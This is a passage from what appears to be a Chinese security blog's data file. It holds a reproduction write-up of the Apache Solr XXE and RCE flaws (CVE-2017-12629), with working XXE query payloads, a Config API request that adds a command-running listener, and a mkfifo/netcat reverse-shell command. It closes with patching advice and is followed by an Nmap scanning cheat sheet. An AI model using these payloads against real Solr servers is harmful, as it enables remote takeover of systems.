mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 7777 &gt; /tmp/f&quot;]&#125;&#125;&quot;]&#125;&#125;&amp;shards=localhost:8983/&quot;&gt;&lt;a&gt;&lt;/a&gt;&apos;&#125;</div></pre></td></tr></table></figure>\n<p>先对stream.body内容进行二次URL编码(因为反弹shell的命令含有特殊字符)，然后在对q内容进行一次URL编码，得到URL(经过编码后的URL很长，这里不列出)。<br><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot09.png\" alt=\"\"><br>会显示error，但实际已经成功。</p>\n<h4 id=\"3-通过XXE更新内容触发动作\"><a href=\"#3-通过XXE更新内容触发动作\" class=\"headerlink\" title=\"3. 通过XXE更新内容触发动作\"></a>3. 通过XXE更新内容触发动作</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://localhost:8983/solr/combineEXP/select?q=&#123;!xmlparser v=&apos;&lt;!DOCTYPE a SYSTEM &quot;http://localhost:8983/solr/combineEXP/update?stream.body=[&#123;&quot;id&quot;:&quot;AAA&quot;&#125;]&amp;commit=true&amp;overwrite=true&quot;&gt;&lt;a&gt;&lt;/a&gt;&apos;&#125;</div></pre></td></tr></table></figure>\n<p>先对stream.body内容进行一次URL编码，然后在对q内容进行一次URL编码，得到URL。<br><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot10.png\" alt=\"\"><br>shell反弹成功！！！</p>\n<h2 id=\"0x04-防护方案\"><a href=\"#0x04-防护方案\" class=\"headerlink\" title=\"0x04 防护方案\"></a>0x04 防护方案</h2><ol>\n<li>关注官方消息，及时升级到solr 7.1版本。</li>\n<li>以系统参数”-Ddisable.configEdit=true”重启Solr实例，可实现临时性防护。(可能会影响正常功能)</li>\n</ol>\n","site":{"data":{}},"excerpt":"<h2 id=\"0x00-简述\"><a href=\"#0x00-简述\" class=\"headerlink\" title=\"0x00 简述\"></a>0x00 简述</h2><p>这里涉及到两个漏洞，一个是外部实体扩展XML External Entity Expansion (deftype=xmlparser) ，另一个是远程代码执行Remote Code Execution (add-listener: RunExecutableListener)。这两个漏洞是由Michael Stepankin (JPMorgan Chase)和Olga Barinova (Gotham Digital Science)发现并公布，此处主要进行漏洞复现。</p>\n<p>原文地址：<a href=\"http://lucene.472066.n3.nabble.com/Re-Several-critical-vulnerabilities-discovered-in-Apache-Solr-XXE-amp-RCE-td4358308.html\">http://lucene.472066.n3.nabble.com/Re-Several-critical-vulnerabilities-discovered-in-Apache-Solr-XXE-amp-RCE-td4358308.html</a></p>\n<p>Solr主页：<a href=\"http://lucene.apache.org/solr/\">http://lucene.apache.org/solr/</a></p>","more":"<p>安装及启动都非常简单，不过需要强调的是，代码执行的漏洞需要在solr -c模式(cloud)下才有效。</p>\n<p>启动后界面如下：<br><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot01.png\" alt=\"\"></p>\n<p><strong>平台：macOS 10.12.6</strong></p>\n<h2 id=\"0x01-XXE复现\"><a href=\"#0x01-XXE复现\" class=\"headerlink\" title=\"0x01 XXE复现\"></a>0x01 XXE复现</h2><p>Lucene包括一个使用XML数据结构创建全功能Lucene查询的解析器。从5.1版本开始，在Sorl的搜索查询中就开始支持xml查询。而出现漏洞的关键点在于Lucene的XML解析器没有明确禁止外部实体的DOCTYPE声明和扩展，造成可以在XML文档中包含指向外部文件(file:// )或者外部URL(http:// )的特殊实体。</p>\n<h4 id=\"1-使用netcat侦听4444端口-“nc-lv-4444”\"><a href=\"#1-使用netcat侦听4444端口-“nc-lv-4444”\" class=\"headerlink\" title=\"1. 使用netcat侦听4444端口 “nc -lv 4444”\"></a>1. 使用netcat侦听4444端口 “nc -lv 4444”</h4><h4 id=\"2-浏览器访问\"><a href=\"#2-浏览器访问\" class=\"headerlink\" title=\"2. 浏览器访问\"></a>2. 浏览器访问</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://localhost:8983/solr/solr/select?q=&#123;!xmlparser v=&apos;&lt;!DOCTYPE a SYSTEM &quot;http://localhost:4444/hello-liehu&quot;&gt;&lt;a&gt;&lt;/a&gt;&apos;&#125;</div></pre></td></tr></table></figure>\n<h4 id=\"3-netcat接收到solr的请求包。\"><a href=\"#3-netcat接收到solr的请求包。\" class=\"headerlink\" title=\"3. netcat接收到solr的请求包。\"></a>3. netcat接收到solr的请求包。</h4><p><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot02.png\" alt=\"\"></p>\n<h2 id=\"0x02-RCE复现-CVE-2017-12629\"><a href=\"#0x02-RCE复现-CVE-2017-12629\" class=\"headerlink\" title=\"0x02 RCE复现( CVE-2017-12629 )\"></a>0x02 RCE复现( CVE-2017-12629 )</h2><p>Solr的RunExecutableListener类可用于对特定事件执行任意命令，例如在每次更新查询后执行(postCommit)。该漏洞的问题点在于这样的监听器可以通过带有add-listener命令的Config API来启用任意参数。</p>\n<h4 id=\"1-新建一个名为Hunter的集合\"><a href=\"#1-新建一个名为Hunter的集合\" class=\"headerlink\" title=\"1. 新建一个名为Hunter的集合\"></a>1. 新建一个名为Hunter的集合</h4><p><a href=\"http://localhost:8983/solr/admin/collections?action=CREATE&amp;name=Hunter&amp;numShards=2&amp;maxShardsPerNode=2\">http://localhost:8983/solr/admin/collections?action=CREATE&amp;name=Hunter&amp;numShards=2&amp;maxShardsPerNode=2</a></p>\n<p><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot03.png\" alt=\"\"><br><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot04.png\" alt=\"\"><br>PS：就复现而言，可以手动在后台添加集合或者使用现有集合。</p>\n<h4 id=\"2-使用netcat侦听4444端口“nc-lv-4444”\"><a href=\"#2-使用netcat侦听4444端口“nc-lv-4444”\" class=\"headerlink\" title=\"2. 使用netcat侦听4444端口“nc -lv 4444”\"></a>2. 使用netcat侦听4444端口“nc -lv 4444”</h4><h4 id=\"3-为集合添加一个新的RunExecutableListener监听器，其中”exe”属性内容为运行命令的名称-“curl”-，”args”属性内容”-http-localhost-4444-helloRCE-“为netcat侦听的端口。\"><a href=\"#3-为集合添加一个新的RunExecutableListener监听器，其中”exe”属性内容为运行命令的名称-“curl”-，”args”属性内容”-http-localhost-4444-helloRCE-“为netcat侦听的端口。\" class=\"headerlink\" title=\"3. 为集合添加一个新的RunExecutableListener监听器，其中”exe”属性内容为运行命令的名称(“curl”)，”args”属性内容” http://localhost:4444/helloRCE “为netcat侦听的端口。\"></a>3. 为集合添加一个新的RunExecutableListener监听器，其中”exe”属性内容为运行命令的名称(“curl”)，”args”属性内容” <a href=\"http://localhost:4444/helloRCE\">http://localhost:4444/helloRCE</a> “为netcat侦听的端口。</h4><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">POST /solr/Hunter/config HTTP/1.1</div><div class=\"line\">Host: localhost:8983</div><div class=\"line\">Connection: close</div><div class=\"line\">Content-Type: application/json  </div><div class=\"line\">Content-Length: 198</div><div class=\"line\"></div><div class=\"line\">&#123;</div><div class=\"line\">  \"add-listener\" : &#123;</div><div class=\"line\">    \"event\":\"postCommit\",</div><div class=\"line\">    \"name\":\"newlistener\",</div><div class=\"line\">    \"class\":\"solr.RunExecutableListener\",</div><div class=\"line\">    \"exe\":\"curl\",</div><div class=\"line\">    \"dir\":\"/usr/bin/\",</div><div class=\"line\">    \"args\":[\"http://localhost:4444/helloRCE\"]</div><div class=\"line\">  &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot05.png\" alt=\"\"></p>\n<blockquote>\n<p>  如果出现如上报错，是因为集合中没有数据。向<a href=\"http://localhost:8983/solr/Hunter/update\">http://localhost:8983/solr/Hunter/update</a> 提交一些数据即可（数据提交方式参考下一步）。（资料参考：<a href=\"https://lucene.apache.org/solr/guide/7_0/uploading-data-with-index-handlers.html\">https://lucene.apache.org/solr/guide/7_0/uploading-data-with-index-handlers.html</a> ）</p>\n<p>  如果监听器已经存在，可以考虑更换name,或者将add-listener修改为update-listener.</p>\n</blockquote>\n<h4 id=\"4-更新集合”Hunter”以触发RunExecutableListener的执行。\"><a href=\"#4-更新集合”Hunter”以触发RunExecutableListener的执行。\" class=\"headerlink\" title=\"4. 更新集合”Hunter”以触发RunExecutableListener的执行。\"></a>4. 更新集合”Hunter”以触发RunExecutableListener的执行。</h4><p>提交更新后，等一段时间后接收到请求包。</p>\n<p><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot06.png\" alt=\"\"></p>\n<h4 id=\"5-反弹Shell\"><a href=\"#5-反弹Shell\" class=\"headerlink\" title=\"5. 反弹Shell\"></a>5. 反弹Shell</h4><p>mac下nc没有-e选项，也没有/dev/tcp，可使用</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">rm <span class=\"_\">-f</span> /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 6666 &gt; /tmp/f</div></pre></td></tr></table></figure>\n<p>update一下监听器：<br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"attr\">\"update-listener\"</span>: &#123;</div><div class=\"line\">        <span class=\"attr\">\"event\"</span>: <span class=\"string\">\"postCommit\"</span>,</div><div class=\"line\">        <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"reverseShell\"</span>,</div><div class=\"line\">        <span class=\"attr\">\"class\"</span>: <span class=\"string\">\"solr.RunExecutableListener\"</span>,</div><div class=\"line\">        <span class=\"attr\">\"exe\"</span>: <span class=\"string\">\"sh\"</span>,</div><div class=\"line\">        <span class=\"attr\">\"dir\"</span>: <span class=\"string\">\"/bin/\"</span>,</div><div class=\"line\">        <span class=\"attr\">\"args\"</span>: [<span class=\"string\">\"-c\"</span>, <span class=\"string\">\"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 6666 &gt; /tmp/f\"</span>]</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>update一下数据，即可收到反弹shell:<br><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot07.png\" alt=\"\"></p>\n<h2 id=\"0x03-XXE-amp-RCE-组合利用\"><a href=\"#0x03-XXE-amp-RCE-组合利用\" class=\"headerlink\" title=\"0x03 XXE&amp;RCE 组合利用\"></a>0x03 XXE&amp;RCE 组合利用</h2><p>通过将如上两个漏洞组合，外部攻击者即使不能直接访问Sorl服务器，也可以实现远程代码执行。 唯一的要求是攻击者可以构造查询参数’q’。 如下的利用便是将所有的payload置于q参数，发起请求即可实现。</p>\n<h4 id=\"1-通过XXE新建集合combineEXP\"><a href=\"#1-通过XXE新建集合combineEXP\" class=\"headerlink\" title=\"1. 通过XXE新建集合combineEXP\"></a>1. 通过XXE新建集合combineEXP</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://localhost:8983/solr/Hunter/select?q=&#123;!xmlparser v=&apos;&lt;!DOCTYPE a SYSTEM &quot;http://localhost:8983/solr/admin/collections?action=CREATE%26name=combineEXP%26numShards=2%26maxShardsPerNode=2&quot;&gt;&lt;a&gt;&lt;/a&gt;&apos;&#125;</div></pre></td></tr></table></figure>\n<p><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot08.png\" alt=\"\"></p>\n<h4 id=\"2-通过XXE添加RunExecutableListener\"><a href=\"#2-通过XXE添加RunExecutableListener\" class=\"headerlink\" title=\"2. 通过XXE添加RunExecutableListener\"></a>2. 通过XXE添加RunExecutableListener</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://localhost:8983/solr/combineEXP/select?q=&#123;!xmlparser v=&apos;&lt;!DOCTYPE a SYSTEM &quot;http://localhost:8983/solr/combineEXP/select?q=xxx&amp;qt=/solr/combineEXP/config?stream.body=&#123;&quot;add-listener&quot;: &#123;&quot;event&quot;: &quot;postCommit&quot;, &quot;name&quot;: &quot;shell&quot;,&quot;class&quot;: &quot;solr.RunExecutableListener&quot;, &quot;exe&quot;: &quot;sh&quot;,&quot;dir&quot;: &quot;/bin/&quot;, &quot;args&quot;: [&quot;-c&quot;, &quot;rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 7777 &gt; /tmp/f&quot;]&#125;&#125;&quot;]&#125;&#125;&amp;shards=localhost:8983/&quot;&gt;&lt;a&gt;&lt;/a&gt;&apos;&#125;</div></pre></td></tr></table></figure>\n<p>先对stream.body内容进行二次URL编码(因为反弹shell的命令含有特殊字符)，然后在对q内容进行一次URL编码，得到URL(经过编码后的URL很长，这里不列出)。<br><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot09.png\" alt=\"\"><br>会显示error，但实际已经成功。</p>\n<h4 id=\"3-通过XXE更新内容触发动作\"><a href=\"#3-通过XXE更新内容触发动作\" class=\"headerlink\" title=\"3. 通过XXE更新内容触发动作\"></a>3. 通过XXE更新内容触发动作</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://localhost:8983/solr/combineEXP/select?q=&#123;!xmlparser v=&apos;&lt;!DOCTYPE a SYSTEM &quot;http://localhost:8983/solr/combineEXP/update?stream.body=[&#123;&quot;id&quot;:&quot;AAA&quot;&#125;]&amp;commit=true&amp;overwrite=true&quot;&gt;&lt;a&gt;&lt;/a&gt;&apos;&#125;</div></pre></td></tr></table></figure>\n<p>先对stream.body内容进行一次URL编码，然后在对q内容进行一次URL编码，得到URL。<br><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot10.png\" alt=\"\"><br>shell反弹成功！！！</p>\n<h2 id=\"0x04-防护方案\"><a href=\"#0x04-防护方案\" class=\"headerlink\" title=\"0x04 防护方案\"></a>0x04 防护方案</h2><ol>\n<li>关注官方消息，及时升级到solr 7.1版本。</li>\n<li>以系统参数”-Ddisable.configEdit=true”重启Solr实例，可实现临时性防护。(可能会影响正常功能)</li>\n</ol>"},{"title":"Nmap cheat sheet","date":"2017-05-07T10:47:45.000Z","_content":"http://www.91ri.org/8654.html\n## Nmap 介绍\n![功能架构图](http://my.csdn.net/uploads/201206/26/1340719324_9785.JPG)\n\n### 四项基本功能\n<!-- more -->\n- 主机发现（Host Discovery）\n\n- 端口扫描（Port Scanning）\n\n- 版本侦测（Version Detection）\n\n- 操作系统侦测（Operating System Detection）\n\n    而这四项功能之间，又存在大致的依赖关系（通常情况下的顺序关系，但特殊应用另外考虑），首先需要进行主机发现，随后确定端口状况，然后确定端口上运行具体应用程序与版本信息，然后可以进行操作系统的侦测。而在四项基本功能的基础上，Nmap提供防火墙与IDS（IntrusionDetection System,入侵检测系统）的规避技巧，可以综合应用到四个基本功能的各个阶段；另外Nmap提供强大的NSE（Nmap Scripting Language）脚本引擎功能，脚本可以对基本功能进行补充和扩展。\n\n## 基本使用\n### 主机发现\n\n\n```bash\nnmap oddboy.cn 192.168.0,1,4-7.2-255 10.1.1.0/24    # 多主机地址扫描\nnmap -A -T4 host        \n# -A 对主机进行完整全面的扫描(主机发现、端口扫描、应用程序与版本侦测、操作系统侦测及调用默认NSE脚本扫描)\n# -T4 指定扫描时序，总共6个级别(0-5),级别越高，速度越快，但容易被防火墙检测屏蔽。\n\n```\n\n\n\n\n## \b常规使用\n\n```bash\nnmap IP/Hostname                    # 最基本的使用情况\nnmap host1 host2 host3 etc...       # 扫描多主机\nnmap 192.168.0.1-192.168.1.254      # 扫描IP地址段\nnmap 192.168.0.1/23                 # CIDR格式的网络地址段（与上一条命令等同）\nnmap -iL list.txt                   # \b扫描目标主机列表\nnmap -Pn host                       # \b假定目标存活\n\n\n\n```\n## 高级使用\n```bash\nnmap -A host                        # ？？？？？？？\n\n\n```\n---\n---\n---\n\n## 渗透测试中不常用(我反正没用过)\n```bash\nnmap 192.168.1.0/24 --exclude 192.168.1.11  # 排除一些主机\nnmap -iR 100                        # \b随机扫描互联网上100个主机\nnmap -Sp                            # 只ping扫描，\nnmap -PS                            # TCP SYN scan (TCP SYN ping)\nnmap -PA                            # TCP ACK scan ping\nnmap -PU                            # UDP scan  ping\nnmap -PY                            # ??? SCTP scan\b ping\nnmap -PE/PP/PM                      # ??? ICMP echo/timestamp/netmask request discovery probes  什么鬼？\nnmap -PO [protocol] host            # 指定协议ping\nnmap -PR                            # ??? ARP ping \nnmap --traceroute                   # traceroute 功能 探测网络路径\nnmap -n/-R                          # Never do DNS resolution/Always resolve [default: sometimes]\nnmap --dns-servers serv1,serv2,,,   # 指定DNS\nnmap --system-dns                   # 使用系统DNS\nnmap -sL IPs                        # 列出IPs\b的反向DNS结果\nnmap \n\n\n\n```\n## 参考资料\n[Introduction to Nmap](http://resources.infosecinstitute.com/nmap-cheat-sheet/)\n\n[Nmap从探测到漏洞利用备忘录 – Nmap简介(一)](http://www.freebuf.com/articles/network/32302.html)\n\n## #\b零散\b\b知识\n\n#### Nmap脚本引擎(NSE)\n    - 网络探测\n    - 漏洞检测\n    - 漏洞利用\n\n#### 端口状态说明\n- Open(开放的): 应用程序正在这个端口上监听连接。\n\n- Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。\n\n- Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。\n\n- Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。\n\n- Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。\n\n- Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。","source":"_posts/Nmap-cheat-sheet.md","raw":"---\ntitle: Nmap cheat sheet\ndate: 2017-05-07 18:47:45\ntags:\n---\nhttp://www.91ri.org/8654.html\n## Nmap 介绍\n![功能架构图](http://my.csdn.net/uploads/201206/26/1340719324_9785.JPG)\n\n### 四项基本功能\n<!-- more -->\n- 主机发现（Host Discovery）\n\n- 端口扫描（Port Scanning）\n\n- 版本侦测（Version Detection）\n\n- 操作系统侦测（Operating System Detection）\n\n    而这四项功能之间，又存在大致的依赖关系（通常情况下的顺序关系，但特殊应用另外考虑），首先需要进行主机发现，随后确定端口状况，然后确定端口上运行具体应用程序与版本信息，然后可以进行操作系统的侦测。而在四项基本功能的基础上，Nmap提供防火墙与IDS（IntrusionDetection System,入侵检测系统）的规避技巧，可以综合应用到四个基本功能的各个阶段；另外Nmap提供强大的NSE（Nmap Scripting Language）脚本引擎功能，脚本可以对基本功能进行补充和扩展。\n\n## 基本使用\n### 主机发现\n\n\n```bash\nnmap oddboy.cn 192.168.0,1,4-7.2-255 10.1.1.0/24    # 多主机地址扫描\nnmap -A -T4 host        \n# -A 对主机进行完整全面的扫描(主机发现、端口扫描、应用程序与版本侦测、操作系统侦测及调用默认NSE脚本扫描)\n# -T4 指定扫描时序，总共6个级别(0-5),级别越高，速度越快，但容易被防火墙检测屏蔽。\n\n```\n\n\n\n\n## \b常规使用\n\n```bash\nnmap IP/Hostname                    # 最基本的使用情况\nnmap host1 host2 host3 etc...       # 扫描多主机\nnmap 192.168.0.1-192.168.1.254      # 扫描IP地址段\nnmap 192.168.0.1/23                 # CIDR格式的网络地址段（与上一条命令等同）\nnmap -iL list.txt                   # \b扫描目标主机列表\nnmap -Pn host                       # \b假定目标存活\n\n\n\n```\n## 高级使用\n```bash\nnmap -A host                        # ？？？？？？？\n\n\n```\n---\n---\n---\n\n## 渗透测试中不常用(我反正没用过)\n```bash\nnmap 192.168.1.0/24 --exclude 192.168.1.11  # 排除一些主机\nnmap -iR 100                        # \b随机扫描互联网上100个主机\nnmap -Sp                            # 只ping扫描，\nnmap -PS                            # TCP SYN scan (TCP SYN ping)\nnmap -PA                            # TCP ACK scan ping\nnmap -PU                            # UDP scan  ping\nnmap -PY                            # ??? SCTP scan\b ping\nnmap -PE/PP/PM                      # ??? ICMP echo/timestamp/netmask request discovery probes  什么鬼？\nnmap -PO [protocol] host            # 指定协议ping\nnmap -PR                            # ??? ARP ping \nnmap --traceroute                   # traceroute 功能 探测网络路径\nnmap -n/-R                          # Never do DNS resolution/Always resolve [default: sometimes]\nnmap --dns-servers serv1,serv2,,,   # 指定DNS\nnmap --system-dns                   # 使用系统DNS\nnmap -sL IPs                        # 列出IPs\b的反向DNS结果\nnmap \n\n\n\n```\n## 参考资料\n[Introduction to Nmap](http://resources.infosecinstitute.com/nmap-cheat-sheet/)\n\n[Nmap从探测到漏洞利用备忘录 – Nmap简介(一)](http://www.freebuf.com/articles/network/32302.html)\n\n## #\b零散\b\b知识\n\n#### Nmap脚本引擎(NSE)\n    - 网络探测\n    - 漏洞检测\n    - 漏洞利用\n\n#### 端口状态说明\n- Open(开放的): 应用程序正在这个端口上监听连接。\n\n- Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。\n\n- Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。\n\n- Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。\n\n- Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。\n\n- Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。","slug":"Nmap-cheat-sheet","published":1,"updated":"2017-06-08T13:14:54.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjfr0000497uvrj947wen","content":"<p><a href=\"http://www.91ri.org/8654.html\" target=\"_blank\" rel=\"external\">http://www.91ri.org/8654.html</a></p>\n<h2 id=\"Nmap-介绍\"><a href=\"#Nmap-介绍\" class=\"headerlink\" title=\"Nmap 介绍\"></a>Nmap 介绍</h2><p><img src=\"http://my.csdn.net/uploads/201206/26/1340719324_9785.JPG\" alt=\"功能架构图\"></p>\n<h3 id=\"四项基本功能\"><a href=\"#四项基本功能\" class=\"headerlink\" title=\"四项基本功能\"></a>四项基本功能</h3><a id=\"more\"></a>\n<ul>\n<li><p>主机发现（Host Discovery）</p>\n</li>\n<li><p>端口扫描（Port Scanning）</p>\n</li>\n<li><p>版本侦测（Version Detection）</p>\n</li>\n<li><p>操作系统侦测（Operating System Detection）</p>\n<p>  而这四项功能之间，又存在大致的依赖关系（通常情况下的顺序关系，但特殊应用另外考虑），首先需要进行主机发现，随后确定端口状况，然后确定端口上运行具体应用程序与版本信息，然后可以进行操作系统的侦测。而在四项基本功能的基础上，Nmap提供防火墙与IDS（IntrusionDetection System,入侵检测系统）的规避技巧，可以综合应用到四个基本功能的各个阶段；另外Nmap提供强大的NSE（Nmap Scripting Language）脚本引擎功能，脚本可以对基本功能进行补充和扩展。</p>\n</li>\n</ul>\n<h2 id=\"基本使用\"><a href=\"#基本使用\" class=\"headerlink\" title=\"基本使用\"></a>基本使用</h2><h3 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap oddboy.cn 192.168.0,1,4-7.2-255 10.1.1.0/24    <span class=\"comment\"># 多主机地址扫描</span></div><div class=\"line\">nmap -A -T4 host        </div><div class=\"line\"><span class=\"comment\"># -A 对主机进行完整全面的扫描(主机发现、端口扫描、应用程序与版本侦测、操作系统侦测及调用默认NSE脚本扫描)</span></div><div class=\"line\"><span class=\"comment\"># -T4 指定扫描时序，总共6个级别(0-5),级别越高，速度越快，但容易被防火墙检测屏蔽。</span></div></pre></td></tr></table></figure>\n<h2 id=\"常规使用\"><a href=\"#常规使用\" class=\"headerlink\" title=\"\b常规使用\"></a>\b常规使用</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap IP/Hostname                    <span class=\"comment\"># 最基本的使用情况</span></div><div class=\"line\">nmap host1 host2 host3 etc...       <span class=\"comment\"># 扫描多主机</span></div><div class=\"line\">nmap 192.168.0.1-192.168.1.254      <span class=\"comment\"># 扫描IP地址段</span></div><div class=\"line\">nmap 192.168.0.1/23                 <span class=\"comment\"># CIDR格式的网络地址段（与上一条命令等同）</span></div><div class=\"line\">nmap -iL list.txt                   <span class=\"comment\"># \b扫描目标主机列表</span></div><div class=\"line\">nmap -Pn host                       <span class=\"comment\"># \b假定目标存活</span></div></pre></td></tr></table></figure>\n<h2 id=\"高级使用\"><a href=\"#高级使用\" class=\"headerlink\" title=\"高级使用\"></a>高级使用</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap -A host                        <span class=\"comment\"># ？？？？？？？</span></div></pre></td></tr></table></figure>\n<h2 id=\"—\"><a href=\"#—\" class=\"headerlink\" title=\"—\"></a>—</h2><hr>\n<h2 id=\"渗透测试中不常用-我反正没用过\"><a href=\"#渗透测试中不常用-我反正没用过\" class=\"headerlink\" title=\"渗透测试中不常用(我反正没用过)\"></a>渗透测试中不常用(我反正没用过)</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap 192.168.1.0/24 --exclude 192.168.1.11  <span class=\"comment\"># 排除一些主机</span></div><div class=\"line\">nmap -iR 100                        <span class=\"comment\"># \b随机扫描互联网上100个主机</span></div><div class=\"line\">nmap -Sp                            <span class=\"comment\"># 只ping扫描，</span></div><div class=\"line\">nmap -PS                            <span class=\"comment\"># TCP SYN scan (TCP SYN ping)</span></div><div class=\"line\">nmap -PA                            <span class=\"comment\"># TCP ACK scan ping</span></div><div class=\"line\">nmap -PU                            <span class=\"comment\"># UDP scan  ping</span></div><div class=\"line\">nmap -PY                            <span class=\"comment\"># ??? SCTP scan\b ping</span></div><div class=\"line\">nmap -PE/PP/PM                      <span class=\"comment\"># ??? ICMP echo/timestamp/netmask request discovery probes  什么鬼？</span></div><div class=\"line\">nmap -PO [protocol] host            <span class=\"comment\"># 指定协议ping</span></div><div class=\"line\">nmap -PR                            <span class=\"comment\"># ??? ARP ping </span></div><div class=\"line\">nmap --traceroute                   <span class=\"comment\"># traceroute 功能 探测网络路径</span></div><div class=\"line\">nmap -n/-R                          <span class=\"comment\"># Never do DNS resolution/Always resolve [default: sometimes]</span></div><div class=\"line\">nmap --dns-servers serv1,serv2,,,   <span class=\"comment\"># 指定DNS</span></div><div class=\"line\">nmap --system-dns                   <span class=\"comment\"># 使用系统DNS</span></div><div class=\"line\">nmap <span class=\"_\">-s</span>L IPs                        <span class=\"comment\"># 列出IPs\b的反向DNS结果</span></div><div class=\"line\">nmap</div></pre></td></tr></table></figure>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><p><a href=\"http://resources.infosecinstitute.com/nmap-cheat-sheet/\" target=\"_blank\" rel=\"external\">Introduction to Nmap</a></p>\n<p><a href=\"http://www.freebuf.com/articles/network/32302.html\" target=\"_blank\" rel=\"external\">Nmap从探测到漏洞利用备忘录 – Nmap简介(一)</a></p>\n<h2 id=\"零散知识\"><a href=\"#零散知识\" class=\"headerlink\" title=\"#\b零散\b\b知识\"></a>#\b零散\b\b知识</h2><h4 id=\"Nmap脚本引擎-NSE\"><a href=\"#Nmap脚本引擎-NSE\" class=\"headerlink\" 